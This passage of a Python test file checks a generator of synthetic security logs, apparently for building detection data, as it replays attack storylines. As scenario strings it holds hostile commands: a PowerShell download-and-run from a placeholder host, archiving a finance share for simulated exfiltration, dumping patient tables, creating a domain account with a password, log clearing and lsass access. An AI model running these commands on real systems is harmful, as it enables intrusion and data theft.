        context = SmbFileTransferMetadataActionBundle(
            request,
            random.Random(8),
            smb_config=smb_config,
        ).execute()

        assert context is not None
        assert context.source == "SMB"
        assert context.is_orig is True
        assert context.total_bytes == 65_536
        assert context.md5
        assert context.filename.startswith(r"\\FILE-SRV-01\Projects")

    def test_staged_archive_smb_read_bundle_anchor_is_stable(self):
        """Identical staged-archive transfer requests should have stable anchors."""
        source = System(hostname="SRC", ip="10.10.1.35", os="Windows 11", type="workstation")
        target = System(
            hostname="FILE-SRV-01",
            ip="10.10.2.20",
            os="Windows Server 2019",
            type="server",
            roles=["file_server"],
        )
        actor = User(username="aisha.johnson", full_name="Aisha", email="aisha@example.com")
        request = StagedArchiveSmbReadRequest(
            actor=actor,
            source_ip=source.ip,
            staging_ip=target.ip,
            archive_path=r"C:\ProgramData\cache.zip",
            smb_filename=r"\\FILE-SRV-01\C$\ProgramData\cache.zip",
            staged_at=datetime(2026, 5, 18, 14, 1, tzinfo=UTC),
            exfil_time=datetime(2026, 5, 18, 14, 25, tzinfo=UTC),
            upload_bytes=4_000_000,
            source_system=source,
            target_system=target,
        )

        first = StagedArchiveSmbReadActionBundle(
            SimpleNamespace(),
            request,
            random.Random(1),
        ).anchor
        second = StagedArchiveSmbReadActionBundle(
            SimpleNamespace(),
            request,
            random.Random(99),
        ).anchor

        assert first == second

    def test_scp_receiver_file_bundle_anchor_is_stable(self):
        """Identical SCP receiver requests should have stable anchors."""
        source = System(hostname="SRC", ip="10.10.0.10", os="Ubuntu 22.04", type="workstation")
        target = System(hostname="DST", ip="10.10.0.20", os="Ubuntu 22.04", type="server")
        actor = User(username="alice", full_name="Alice", email="alice@example.com")
        request = ScpReceiverFileRequest(
            source_system=source,
            target_system=target,
            actor=actor,
            source_pid=4242,
            source_process="/usr/bin/scp",
            source_command="scp /tmp/a root@DST:/var/tmp/a",
            target_user="root",
            target_path="/var/tmp/a",
            transfer_time=datetime(2026, 5, 11, 12, 0, tzinfo=UTC),
            source_port=45678,
        )

        first = ScpReceiverFileActionBundle(SimpleNamespace(), request, random.Random(1)).anchor
        second = ScpReceiverFileActionBundle(SimpleNamespace(), request, random.Random(99)).anchor

        assert first == second


class TestStorylineScpCorrelation:
    def test_process_url_connection_waits_for_visible_process_create(self):
        source = System(
            hostname="SRC",
            ip="10.10.0.10",
            os="Windows 11 Enterprise",
            type="workstation",
        )
        actor = User(
            username="alice",
            full_name="Alice Example",
            email="alice@example.com",
        )
        engine = object.__new__(StorylineMixin)
        engine.scenario = SimpleNamespace(
            environment=SimpleNamespace(systems=[source], service_accounts=[])
        )
        engine.state_manager = _FakeStateManager()
        engine.activity_generator = _FakeActivityGenerator()
        engine.dispatcher = SimpleNamespace(visibility_engine=None)
        event_time = datetime(2026, 5, 11, 12, 0, tzinfo=UTC)
        visible_process_time = event_time + timedelta(seconds=4)
        engine.activity_generator.process_source_times[(source.hostname, 4242)] = (
            visible_process_time
        )
        spec = SimpleNamespace(
            type="process",
            process_name=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            command_line=(
                "powershell.exe -NoProfile -Command "
                '"IEX (New-Object Net.WebClient).DownloadString('
                "'https://cdn.example.test/stage.ps1')\""
            ),
        )

        engine._execute_typed_event(
            spec=spec,
            actor=actor,
            system=source,
            time=event_time,
            activity="download stage",
            explicit_types={"process"},
        )

        conn = engine.activity_generator.connections[0]
        assert conn["time"] > visible_process_time
        assert conn["pid"] == 4242
        assert conn["hostname"] == "cdn.example.test"

    def test_scp_receiver_artifacts_reuse_network_source_port(self):
        source = System(
            hostname="SRC",
            ip="10.10.0.10",
            os="Ubuntu 22.04",
            type="workstation",
        )
        target = System(
            hostname="DST",
            ip="10.10.0.20",
            os="Ubuntu 22.04",
            type="server",
        )
        actor = User(
            username="alice",
            full_name="Alice Example",
            email="alice@example.com",
        )
        engine = object.__new__(StorylineMixin)
        engine.scenario = SimpleNamespace(
            environment=SimpleNamespace(systems=[source, target], service_accounts=[])
        )
        engine.state_manager = _FakeStateManager()
        engine.activity_generator = _FakeActivityGenerator()
        engine.dispatcher = SimpleNamespace(visibility_engine=None)
        receiver_ports: list[int] = []

        def capture_receiver_artifacts(**kwargs) -> None:
            receiver_ports.append(kwargs["source_port"])

        engine._emit_scp_receiver_artifacts = capture_receiver_artifacts
        spec = SimpleNamespace(
            type="process",
            process_name="scp",
            command_line="scp /tmp/archive.tar.gz root@DST:/var/tmp/archive.tar.gz",
        )

        engine._execute_typed_event(
            spec=spec,
            actor=actor,
            system=source,
            time=datetime(2026, 5, 11, 12, 0, tzinfo=UTC),
            activity="copy archive to staging host",
            explicit_types={"process"},
        )

        assert engine.activity_generator.reserved_ports == [45678]
        assert engine.activity_generator.connections == []
        assert engine.activity_generator.ssh_sessions[0]["source_port"] == 45678
        assert engine.activity_generator.ssh_sessions[0]["source"] == "storyline_scp"
        assert receiver_ports == [45678]

    def test_scp_network_and_receiver_artifacts_wait_for_visible_source_process_create(self):
        source = System(
            hostname="SRC",
            ip="10.10.0.10",
            os="Ubuntu 22.04",
            type="workstation",
        )
        target = System(
            hostname="DST",
            ip="10.10.0.20",
            os="Ubuntu 22.04",
            type="server",
        )
        actor = User(
            username="alice",
            full_name="Alice Example",
            email="alice@example.com",
        )
        engine = object.__new__(StorylineMixin)
        engine.scenario = SimpleNamespace(
            environment=SimpleNamespace(systems=[source, target], service_accounts=[])
        )
        engine.state_manager = _FakeStateManager()
        engine.activity_generator = _FakeActivityGenerator()
        engine.dispatcher = SimpleNamespace(visibility_engine=None)
        receiver_transfer_times: list[datetime] = []

        def capture_receiver_artifacts(**kwargs) -> None:
            receiver_transfer_times.append(kwargs["transfer_time"])

        engine._emit_scp_receiver_artifacts = capture_receiver_artifacts
        spec = SimpleNamespace(
            type="process",
            process_name="/usr/bin/scp",
            command_line="scp /tmp/archive.tar.gz root@DST:/var/tmp/archive.tar.gz",
        )
        event_time = datetime(2026, 5, 11, 12, 0, tzinfo=UTC)
        visible_process_time = event_time + timedelta(seconds=4)
        engine.activity_generator.process_source_times[(source.hostname, 4242)] = (
            visible_process_time
        )

        engine._execute_typed_event(
            spec=spec,
            actor=actor,
            system=source,
            time=event_time,
            activity="copy archive to staging host",
            explicit_types={"process"},
        )

        ssh_session = engine.activity_generator.ssh_sessions[0]
        assert ssh_session["time"] > visible_process_time
        assert receiver_transfer_times == [ssh_session["time"]]

    def test_sqlcmd_remote_private_ip_generates_failed_tcp_attempt(self):
        source = System(
            hostname="SRC",
            ip="10.10.1.31",
            os="Windows 11 Enterprise",
            type="workstation",
        )
        actor = User(
            username="marcus.chen",
            full_name="Marcus Chen",
            email="marcus.chen@example.com",
        )
        engine = object.__new__(StorylineMixin)
        engine.scenario = SimpleNamespace(
            environment=SimpleNamespace(systems=[source], service_accounts=[], network=None)
        )
        engine.state_manager = _FakeStateManager()
        engine.activity_generator = _FakeActivityGenerator()
        engine.dispatcher = SimpleNamespace(visibility_engine=None)
        spec = SimpleNamespace(
            type="process",
            process_name="sqlcmd.exe",
            command_line=(
                "sqlcmd.exe -S 10.0.2.50 -d hr_records -Q "
                '"SELECT name, recovery_model_desc FROM sys.databases"'
            ),
        )
        event_time = datetime(2026, 5, 11, 12, 0, tzinfo=UTC)
        visible_process_time = event_time + timedelta(seconds=3)
        engine.activity_generator.process_source_times[(source.hostname, 4242)] = (
            visible_process_time
        )

        engine._execute_typed_event(
            spec=spec,
            actor=actor,
            system=source,
            time=event_time,
            activity="check sql server",
            explicit_types={"process"},
        )

        conn = engine.activity_generator.connections[0]
        assert conn["src_ip"] == "10.10.1.31"
        assert conn["dst_ip"] == "10.0.2.50"
        assert conn["dst_port"] == 1433
        assert conn["proto"] == "tcp"
        assert conn["pid"] == 4242
        assert conn["conn_state"] == "S0"
        assert conn["firewall"].action == "deny"
        assert conn["service"] is None
        assert conn["time"] > visible_process_time

    def test_sqlcmd_unresolved_host_generates_unrouted_failed_tcp_attempt(self):
        source = System(
            hostname="SRC",
            ip="10.10.1.31",
            os="Windows 11 Enterprise",
            type="workstation",
        )
        actor = User(
            username="marcus.chen",
            full_name="Marcus Chen",
            email="marcus.chen@example.com",
        )
        engine = object.__new__(StorylineMixin)
        engine._ad_domain = "example.com"
        engine.scenario = SimpleNamespace(
            environment=SimpleNamespace(systems=[source], service_accounts=[], network=None)
        )
        engine.state_manager = _FakeStateManager()
        engine.activity_generator = _FakeActivityGenerator()
        engine.dispatcher = SimpleNamespace(visibility_engine=None)
        spec = SimpleNamespace(
            type="process",
            process_name="sqlcmd.exe",
            command_line='sqlcmd.exe -S sqlprod01 -d hr_records -Q "SELECT 1"',
        )

        engine._execute_typed_event(
            spec=spec,
            actor=actor,
            system=source,
            time=datetime(2026, 5, 11, 12, 0, tzinfo=UTC),
            activity="check remote sql host",
            explicit_types={"process"},
        )

        conn = engine.activity_generator.connections[0]
        assert conn["dst_ip"].startswith("10.0.2.")
        assert conn["hostname"] == "sqlprod01.example.com"
        assert conn["dst_port"] == 1433
        assert conn["conn_state"] == "S0"
        assert conn["firewall"].action == "deny"

    def test_sqlcmd_unresolved_host_collision_still_generates_failed_tcp_attempt(self):
        source = System(
            hostname="SRC",
            ip="10.10.1.31",
            os="Windows 11 Enterprise",
            type="workstation",
        )
        colliding_target_ip = StorylineMixin._unresolved_database_target_ip("sqlprod01")
        unrelated = System(
            hostname="UNRELATED-FILESERVER",
            ip=colliding_target_ip,
            os="Windows Server 2022",
            type="server",
        )
        actor = User(
            username="marcus.chen",
            full_name="Marcus Chen",
            email="marcus.chen@example.com",
        )
        engine = object.__new__(StorylineMixin)
        engine._ad_domain = "example.com"
        engine.scenario = SimpleNamespace(
            environment=SimpleNamespace(
                systems=[source, unrelated],
                service_accounts=[],
                network=None,
            )
        )
        engine.state_manager = _FakeStateManager()
        engine.activity_generator = _FakeActivityGenerator()
        engine.dispatcher = SimpleNamespace(visibility_engine=None)
        spec = SimpleNamespace(
            type="process",
            process_name="sqlcmd.exe",
            command_line='sqlcmd.exe -S sqlprod01 -d hr_records -Q "SELECT 1"',
        )

        engine._execute_typed_event(
            spec=spec,
            actor=actor,
            system=source,
            time=datetime(2026, 5, 11, 12, 0, tzinfo=UTC),
            activity="check remote sql host",
            explicit_types={"process"},
        )

        conn = engine.activity_generator.connections[0]
        assert conn["dst_ip"] == colliding_target_ip
        assert conn["hostname"] == "sqlprod01.example.com"
        assert conn["conn_state"] == "S0"
        assert conn["firewall"].action == "deny"
        assert conn["service"] is None

    def test_sqlcmd_local_instance_does_not_generate_network_attempt(self):
        source = System(
            hostname="SRC",
            ip="10.10.1.31",
            os="Windows 11 Enterprise",
            type="workstation",
        )
        actor = User(
            username="marcus.chen",
            full_name="Marcus Chen",
            email="marcus.chen@example.com",
        )
        engine = object.__new__(StorylineMixin)
        engine.scenario = SimpleNamespace(
            environment=SimpleNamespace(systems=[source], service_accounts=[], network=None)
        )
        engine.state_manager = _FakeStateManager()
        engine.activity_generator = _FakeActivityGenerator()
        engine.dispatcher = SimpleNamespace(visibility_engine=None)
        spec = SimpleNamespace(
            type="process",
            process_name="sqlcmd.exe",
            command_line='sqlcmd.exe -S SQLEXPRESS -Q "SELECT * FROM INFORMATION_SCHEMA.TABLES"',
        )

        engine._execute_typed_event(
            spec=spec,
            actor=actor,
            system=source,
            time=datetime(2026, 5, 11, 12, 0, tzinfo=UTC),
            activity="check local sql instance",
            explicit_types={"process"},
        )

        assert engine.activity_generator.connections == []


class TestStorylineCommandSideEffects:
    def test_explicit_account_created_after_net_user_password_add_emits_followups(self):
        dc = System(
            hostname="DC-01",
            ip="10.10.2.10",
            os="Windows Server 2019",
            type="domain_controller",
        )
        actor = User(
            username="SYSTEM",
            full_name="Local System",
            email="system@example.local",
        )
        engine = object.__new__(StorylineMixin)
        engine.scenario = SimpleNamespace(
            environment=SimpleNamespace(systems=[dc], service_accounts=[])
        )
        engine.activity_generator = _FakeActivityGenerator()
        engine.dispatcher = SimpleNamespace(visibility_engine=None, storyline_cluster_id=None)
        engine._ensure_account_sid_tracking()
        create_time = datetime(2024, 3, 18, 16, 14, 33, tzinfo=UTC)

        engine._record_storyline_account_create_command(
            dc,
            "net user svc_mhsync MhsSvc!2024 /add /domain",
        )
        event = engine._execute_typed_event(
            spec=SimpleNamespace(
                type="account_created",
                target_username="svc_mhsync",
                target_sid="S-1-5-21-1-2-3-2906",
            ),
            actor=actor,
            system=dc,
            time=create_time,
            activity="Domain account svc_mhsync created",
            explicit_types={"account_created"},
        )

        assert event is not None
        assert engine.activity_generator.account_creates[0]["target_sid"].endswith("-2906")
        assert engine.activity_generator.password_resets[0]["target_username"] == "svc_mhsync"
        account_change = engine.activity_generator.account_changes[0]
        assert account_change["time"] > engine.activity_generator.password_resets[0]["time"]
        assert account_change["password_last_set_to_event_time"] is True
        assert account_change["old_uac_value"] == "0x15"
        assert account_change["new_uac_value"] == "0x10"

    def test_compress_archive_exfil_emits_archive_sized_smb_download(self):
        source = System(
            hostname="WS-AJOHNSON-01",
            ip="10.10.1.35",
            os="Windows 11",
            type="workstation",
        )
        file_server = System(
            hostname="FILE-SRV-01",
            ip="10.10.2.20",
            os="Windows Server 2019",
            type="server",
            roles=["file_server"],
        )
        actor = User(
            username="aisha.johnson",
            full_name="Aisha Johnson",
            email="aisha.johnson@example.com",
        )
        engine = object.__new__(StorylineMixin)
        engine.scenario = SimpleNamespace(
            environment=SimpleNamespace(systems=[source, file_server], service_accounts=[])
        )
        engine.state_manager = _FakeStateManager()
        engine.state_manager.sessions["0xabc"] = SimpleNamespace(
            system=file_server.hostname,
            source_ip=source.ip,
        )
        engine.activity_generator = _FakeActivityGenerator()
        engine.activity_generator._ip_to_system = {
            source.ip: source,
            file_server.ip: file_server,
        }
        engine.dispatcher = SimpleNamespace(visibility_engine=None)
        smb_logons: list[dict[str, Any]] = []

        def capture_smb_logon_pair(
            actor: User,
            dst_sys: System,
            src_ip: str,
            time: datetime,
            rng: random.Random,
            *,
            source_port: int | None = None,
            emit_network_evidence: bool = True,
        ) -> None:
            _ = time, rng
            smb_logons.append(
                {
                    "actor": actor.username,
                    "dst": dst_sys.hostname,
                    "emit_network_evidence": emit_network_evidence,
                    "source_port": source_port,
                    "src_ip": src_ip,
                }
            )

        engine._emit_smb_logon_pair = capture_smb_logon_pair
        archive_time = datetime(2026, 5, 18, 14, 1, tzinfo=UTC)
        upload_time = datetime(2026, 5, 18, 14, 25, tzinfo=UTC)
        engine.state_manager.sessions["0xabc"] = SimpleNamespace(
            username=actor.username,
            system=file_server.hostname,
            logon_id="0xabc",
            logon_type=3,
            source_ip=source.ip,
            start_time=archive_time - timedelta(minutes=5),
            network_close_time=upload_time + timedelta(minutes=5),
        )
        engine._record_storyline_logon(actor, file_server, "0xabc", source_ip=source.ip)
        process_spec = SimpleNamespace(
            type="process",
            process_name="powershell.exe",
            command_line=(
                'powershell.exe -NoProfile -Command "Compress-Archive '
                r"-Path \\FILE-SRV-01\Finance\Q1\* "
                r"-DestinationPath C:\ProgramData\Microsoft\cache_7f3a.zip"
                '"'
            ),
            supplementary="none",
        )

        engine._execute_typed_event(
            spec=process_spec,
            actor=actor,
            system=file_server,
            time=archive_time,
            activity="Stage archive",
            explicit_types={"process"},
        )
        engine._execute_typed_event(
            spec=ConnectionEventSpec(
                dst_ip="45.33.32.30",
                dst_port=443,
                hostname="api.westbridge-services.net",
                service="ssl",
                source_ip=source.ip,
                method="POST",
                uri="/upload/telemetry/7f3a2b19",
                technique="T1041",
                description="Exfiltrate staged archive",
                orig_bytes=314_782_613,
                resp_bytes=2048,
            ),
            actor=actor,
            system=source,
            time=upload_time,
            activity="Upload staged archive",
            explicit_types={"connection"},
        )

        assert len(engine.activity_generator.connections) == 2
        smb_transfer, upload = engine.activity_generator.connections
        assert smb_transfer["dst_port"] == 445
        assert smb_transfer["service"] == "smb"
        assert smb_transfer["src_ip"] == source.ip
        assert smb_transfer["dst_ip"] == file_server.ip
        assert archive_time < smb_transfer["time"] < upload_time
        assert smb_transfer["resp_bytes"] > 300_000_000
        assert upload["dst_port"] == 443

        file_transfer = smb_transfer["file_transfer"]
        assert isinstance(file_transfer, FileTransferContext)
        assert file_transfer.source == "SMB"
        assert file_transfer.is_orig is False
        assert file_transfer.total_bytes == smb_transfer["resp_bytes"]
        assert file_transfer.filename == (r"\\FILE-SRV-01\C$\ProgramData\Microsoft\cache_7f3a.zip")
        assert smb_logons == [
            {
                "actor": actor.username,
                "dst": file_server.hostname,
                "emit_network_evidence": False,
                "source_port": 50000,
                "src_ip": source.ip,
            }
        ]

    def test_scp_receiver_file_artifacts_leave_ssh_syslog_to_bundle(self):
        source = System(
            hostname="SRC",
            ip="10.10.4.10",
            os="Ubuntu 22.04",
            type="workstation",
        )
        target = System(
            hostname="DST",
            ip="10.10.2.30",
            os="Ubuntu 22.04",
            type="server",
        )
        actor = User(
            username="alice",
            full_name="Alice Example",
            email="alice@example.com",
        )
        engine = object.__new__(StorylineMixin)
        engine.state_manager = _FakeStateManager()
        engine.activity_generator = _FakeActivityGenerator()
        file_events: list[Any] = []
        engine.dispatcher = SimpleNamespace(
            dispatch=lambda event: (
                file_events.append(event) if event.event_type == "file_create" else None
            )
        )
        transfer_time = datetime(2024, 3, 18, 17, 15, 2, 638000, tzinfo=UTC)

        engine._emit_scp_receiver_artifacts(
            source_system=source,
            target_system=target,
            actor=actor,
            source_pid=4242,
            source_process="/usr/bin/scp",
            source_command="scp /tmp/archive.tar.gz root@DST:/var/tmp/archive.tar.gz",
            target_user="root",
            target_path="/var/tmp/archive.tar.gz",
            transfer_time=transfer_time,
            source_port=40117,
            rng=random.Random(7),
        )

        assert engine.activity_generator.syslog_events == []
        assert file_events
        assert file_events[0].event_type == "file_create"

    def test_scp_receiver_file_waits_for_visible_source_process_create(self):
        source = System(
            hostname="SRC",
            ip="10.10.4.10",
            os="Ubuntu 22.04",
            type="workstation",
        )
        target = System(
            hostname="DST",
            ip="10.10.2.30",
            os="Ubuntu 22.04",
            type="server",
        )
        actor = User(
            username="alice",
            full_name="Alice Example",
            email="alice@example.com",
        )
        engine = object.__new__(StorylineMixin)
        engine.state_manager = _FakeStateManager()
        engine.activity_generator = _FakeActivityGenerator()
        file_events: list[Any] = []
        engine.dispatcher = SimpleNamespace(
            dispatch=lambda event: (
                file_events.append(event) if event.event_type == "file_create" else None
            )
        )
        transfer_time = datetime(2024, 3, 18, 17, 15, 2, 638000, tzinfo=UTC)
        visible_source_process_time = transfer_time + timedelta(seconds=5)
        engine.activity_generator.process_source_times[(source.hostname, 4242)] = (
            visible_source_process_time
        )

        engine._emit_scp_receiver_artifacts(
            source_system=source,
            target_system=target,
            actor=actor,
            source_pid=4242,
            source_process="/usr/bin/scp",
            source_command="scp /tmp/archive.tar.gz root@DST:/var/tmp/archive.tar.gz",
            target_user="root",
            target_path="/var/tmp/archive.tar.gz",
            transfer_time=transfer_time,
            source_port=40117,
            rng=random.Random(7),
        )

        assert file_events
        assert file_events[0].timestamp > visible_source_process_time

    def test_scp_receiver_file_waits_for_ssh_session_readiness(self):
        source = System(
            hostname="SRC",
            ip="10.10.4.10",
            os="Ubuntu 22.04",
            type="workstation",
        )
        target = System(
            hostname="DST",
            ip="10.10.2.30",
            os="Ubuntu 22.04",
            type="server",
        )
        actor = User(
            username="alice",
            full_name="Alice Example",
            email="alice@example.com",
        )
        engine = object.__new__(StorylineMixin)
        engine.state_manager = _FakeStateManager()
        engine.activity_generator = _FakeActivityGenerator()
        file_events: list[Any] = []
        engine.dispatcher = SimpleNamespace(
            dispatch=lambda event: (
                file_events.append(event) if event.event_type == "file_create" else None
            )
        )
        transfer_time = datetime(2024, 3, 18, 17, 15, 2, 638000, tzinfo=UTC)
        ready_time = transfer_time + timedelta(seconds=8)
        engine.activity_generator.ssh_ready_times[(source.ip, 40117, target.ip)] = ready_time

        engine._emit_scp_receiver_artifacts(
            source_system=source,
            target_system=target,
            actor=actor,
            source_pid=4242,
            source_process="/usr/bin/scp",
            source_command="scp /tmp/archive.tar.gz root@DST:/var/tmp/archive.tar.gz",
            target_user="root",
            target_path="/var/tmp/archive.tar.gz",
            transfer_time=transfer_time,
            source_port=40117,
            rng=random.Random(7),
        )

        assert file_events
        assert file_events[0].timestamp > ready_time

    def test_linux_process_uses_scheduled_bash_history_time(self):
        source = System(
            hostname="SRC",
            ip="10.10.0.10",
            os="Ubuntu 22.04",
            type="workstation",
        )
        actor = User(
            username="alice",
            full_name="Alice Example",
            email="alice@example.com",
        )
        engine = object.__new__(StorylineMixin)
        engine.scenario = SimpleNamespace(
            environment=SimpleNamespace(systems=[source], service_accounts=[])
        )
        engine.state_manager = _FakeStateManager()
        engine.activity_generator = _FakeActivityGenerator()
        engine.activity_generator.bash_schedule_offset = timedelta(seconds=45)
        engine.dispatcher = SimpleNamespace(visibility_engine=None)
        requested_time = datetime(2026, 5, 11, 12, 0, tzinfo=UTC)
        spec = SimpleNamespace(
            type="process",
            process_name="id",
            command_line="id",
        )

        engine._execute_typed_event(
            spec=spec,
            actor=actor,
            system=source,
            time=requested_time,
            activity="check current user",
            explicit_types={"process"},
        )

        scheduled_time = requested_time + timedelta(seconds=45)
        assert engine.activity_generator.bash_commands[0]["scheduled_time"] == scheduled_time
        assert engine.activity_generator.processes[0]["time"] == scheduled_time

    def test_linux_storyline_foreground_chain_waits_for_prior_termination(self):
        source = System(
            hostname="DB-PROD-01",
            ip="10.10.2.40",
            os="Ubuntu 22.04",
            type="server",
        )
        target = System(
            hostname="APP-INT-01",
            ip="10.10.2.30",
            os="Ubuntu 22.04",
            type="server",
        )
        actor = User(
            username="root",
            full_name="Root",
            email="root@example.local",
        )
        engine = object.__new__(StorylineMixin)
        engine.scenario = SimpleNamespace(
            environment=SimpleNamespace(systems=[source, target], service_accounts=[])
        )
        engine.state_manager = _FakeStateManager()
        engine.activity_generator = _FakeActivityGenerator()
        engine.activity_generator.process_source_termination_offset = timedelta(seconds=20)
        engine.dispatcher = SimpleNamespace(visibility_engine=None, dispatch=lambda event: None)
        engine.malicious_events = []
        start_time = datetime(2026, 5, 11, 17, 15, tzinfo=UTC)
        specs = [
            SimpleNamespace(
                type="process",
                process_name="/usr/bin/mysqldump",
                command_line=(
                    "mysqldump --single-transaction ehr patients insurance_claims "
                    "> /tmp/rpt_0318.sql"
                ),
            ),
            SimpleNamespace(
                type="process",
                process_name="/usr/bin/gzip",
                command_line="gzip -9 /tmp/rpt_0318.sql",
            ),
            SimpleNamespace(
                type="process",
                process_name="/usr/bin/scp",
                command_line="scp /tmp/rpt_0318.sql.gz root@10.10.2.30:/tmp/rpt_0318.sql.gz",
            ),
        ]

        for spec in specs:
            engine._execute_typed_event(
                spec=spec,
                actor=actor,
                system=source,
                time=start_time,
                activity="dump, compress, and transfer database archive",
                explicit_types={"process"},
            )

        process_times = [
            item["time"] for item in engine.activity_generator.processes if "time" in item
        ]
        bash_times = [item["scheduled_time"] for item in engine.activity_generator.bash_commands]
        assert bash_times == process_times
        assert process_times == sorted(process_times)
        assert process_times[1] > process_times[0] + timedelta(seconds=5)
        assert process_times[2] > process_times[1] + timedelta(seconds=5)
        termination_times = [
            item["time"] for item in engine.activity_generator.process_terminations
        ]
        source_termination_times = engine.activity_generator.process_source_termination_times
        assert termination_times[0] < process_times[1]
        assert termination_times[1] < process_times[2]
        assert source_termination_times[(source.hostname, 4243)] < process_times[2]
        assert engine.activity_generator.ssh_sessions
        assert engine.activity_generator.ssh_sessions[0]["time"] > process_times[2]

    def test_net_domain_queries_do_not_auto_emit_4648(self):
        source = System(
            hostname="SRC",
            ip="10.10.0.10",
            os="Windows 10",
            type="workstation",
        )
        actor = User(
            username="alice",
            full_name="Alice Example",
            email="alice@example.com",
        )
        engine = object.__new__(StorylineMixin)
        engine.scenario = SimpleNamespace(
            environment=SimpleNamespace(systems=[source], service_accounts=[])
        )
        engine.state_manager = _FakeStateManager()
        engine.activity_generator = _FakeActivityGenerator()
        engine.dispatcher = SimpleNamespace(visibility_engine=None)
        spec = SimpleNamespace(
            type="process",
            process_name="net.exe",
            command_line='net group "Domain Admins" /domain',
        )

        engine._execute_typed_event(
            spec=spec,
            actor=actor,
            system=source,
            time=datetime(2026, 5, 11, 12, 0, tzinfo=UTC),
            activity="query domain admins",
            explicit_types={"process"},
        )

        assert engine.activity_generator.explicit_credentials == []

    def test_service_backed_process_does_not_emit_second_payload_file_create(self):
        source = System(
            hostname="DC-01",
            ip="10.10.0.10",
            os="Windows Server 2022",
            type="domain_controller",
        )
        actor = User(
            username="alice",
            full_name="Alice Example",
            email="alice@example.com",
        )
        engine = object.__new__(StorylineMixin)
        engine.scenario = SimpleNamespace(
            environment=SimpleNamespace(systems=[source], service_accounts=[])
        )
        engine.state_manager = _FakeStateManager()
        engine.activity_generator = _FakeActivityGenerator()
        engine.dispatcher = SimpleNamespace(visibility_engine=None)
        spec = SimpleNamespace(
            type="process",
            process_name=r"C:\Windows\System32\PSEXESVC.exe",
            command_line="PSEXESVC.exe -accepteula",
        )

        engine._execute_typed_event(
            spec=spec,
            actor=actor,
            system=source,
            time=datetime(2026, 5, 11, 12, 0, tzinfo=UTC),
            activity="start service",
            explicit_types={"process", "service_installed"},
        )

        assert engine.activity_generator.processes[0]["ensure_file_event"] is False

    def test_service_installed_reuses_sc_create_start_type(self):
        source = System(
            hostname="DC-01",
            ip="10.10.0.10",
            os="Windows Server 2022",
            type="domain_controller",
        )
        actor = User(
            username="alice",
            full_name="Alice Example",
            email="alice@example.com",
        )
        engine = object.__new__(StorylineMixin)
        engine.scenario = SimpleNamespace(
            environment=SimpleNamespace(systems=[source], service_accounts=[])
        )
        engine.state_manager = _FakeStateManager()
        engine.activity_generator = _FakeActivityGenerator()
        engine.dispatcher = SimpleNamespace(visibility_engine=None)
        base_time = datetime(2026, 5, 11, 12, 0, tzinfo=UTC)

        engine._execute_typed_event(
            spec=SimpleNamespace(
                type="process",
                process_name=r"C:\Windows\System32\sc.exe",
                command_line=(
                    r"sc.exe create DeviceSyncSvc binPath= "
                    r"C:\Windows\System32\DeviceSyncSvc.exe obj= LocalSystem start= auto"
                ),
            ),
            actor=actor,
            system=source,
            time=base_time,
            activity="create service",
            explicit_types={"process", "service_installed"},
        )
        engine._execute_typed_event(
            spec=SimpleNamespace(
                type="service_installed",
                service_name="DeviceSyncSvc",
                service_file_name=r"C:\Windows\System32\DeviceSyncSvc.exe",
                service_account="LocalSystem",
            ),
            actor=actor,
            system=source,
            time=base_time + timedelta(seconds=2),
            activity="service audit",
            explicit_types={"process", "service_installed"},
        )

        assert engine.activity_generator.service_installs[0]["service_start_type"] == "2"

    def test_storyline_effects_wait_for_visible_process_create(self):
        source = System(
            hostname="DC-01",
            ip="10.10.0.10",
            os="Windows Server 2022",
            type="domain_controller",
        )
        actor = User(
            username="alice",
            full_name="Alice Example",
            email="alice@example.com",
        )
        engine = object.__new__(StorylineMixin)
        engine.scenario = SimpleNamespace(
            environment=SimpleNamespace(systems=[source], service_accounts=[])
        )
        engine.state_manager = _FakeStateManager()
        engine.activity_generator = _FakeActivityGenerator()
        engine.dispatcher = SimpleNamespace(visibility_engine=None)
        engine._ensure_account_sid_tracking()
        base_time = datetime(2026, 5, 11, 12, 0, tzinfo=UTC)
        visible_process_time = base_time + timedelta(seconds=4)

        engine._execute_typed_event(
            spec=SimpleNamespace(
                type="process",
                process_name=r"C:\Windows\System32\sc.exe",
                command_line=(
                    r"sc.exe create DeviceSyncSvc binPath= "
                    r"C:\Windows\System32\DeviceSyncSvc.exe obj= LocalSystem start= auto"
                ),
            ),
            actor=actor,
            system=source,
            time=base_time,
            activity="create service",
            explicit_types={"process", "service_installed"},
        )
        engine.state_manager.processes[(source.hostname, 4242)] = SimpleNamespace(
            username=actor.username,
            logon_id="0xabc",
            start_time=base_time,
        )
        engine.activity_generator.process_source_times[(source.hostname, 4242)] = (
            visible_process_time
        )
        effect_time = base_time + timedelta(seconds=2)

        engine._execute_typed_event(
            spec=SimpleNamespace(
                type="service_installed",
                service_name="DeviceSyncSvc",
                service_file_name=r"C:\Windows\System32\DeviceSyncSvc.exe",
                service_account="LocalSystem",
            ),
            actor=actor,
            system=source,
            time=effect_time,
            activity="service audit",
            explicit_types={"process", "service_installed"},
        )
        engine._execute_typed_event(
            spec=SimpleNamespace(
                type="group_member_added",
                scope="domain",
                group_name="Domain Admins",
                member_name="svc_mhsync",
            ),
            actor=actor,
            system=source,
            time=effect_time,
            activity="add domain admin",
            explicit_types={"group_member_added"},
        )
        engine._execute_typed_event(
            spec=SimpleNamespace(type="log_cleared"),
            actor=actor,
            system=source,
            time=effect_time,
            activity="clear security log",
            explicit_types={"log_cleared"},
        )
        engine._execute_typed_event(
            spec=SimpleNamespace(
                type="process_access",
                target_process="lsass.exe",
                access_mask="0x1010",
            ),
            actor=actor,
            system=source,
            time=effect_time,
            activity="read lsass",
            explicit_types={"process_access"},
        )

        assert engine.activity_generator.service_installs[0]["time"] > visible_process_time
        assert engine.activity_generator.group_memberships[0]["time"] > visible_process_time
        assert engine.activity_generator.log_clears[0]["time"] > visible_process_time
        assert engine.activity_generator.process_accesses[0]["time"] > visible_process_time

    def test_account_create_barriers_following_group_add_command(self):
        source = System(
            hostname="DC-01",
            ip="10.10.0.10",
            os="Windows Server 2022",
            type="domain_controller",
        )
        actor = User(
            username="SYSTEM",
            full_name="Local System",
            email="system@example.local",
        )
        engine = object.__new__(StorylineMixin)
        engine.scenario = SimpleNamespace(
            environment=SimpleNamespace(systems=[source], service_accounts=[])
        )
        engine.state_manager = _FakeStateManager()
        engine.activity_generator = _FakeActivityGenerator()
        engine.dispatcher = SimpleNamespace(visibility_engine=None)
        engine._ensure_account_sid_tracking()
        rng = random.Random(7)
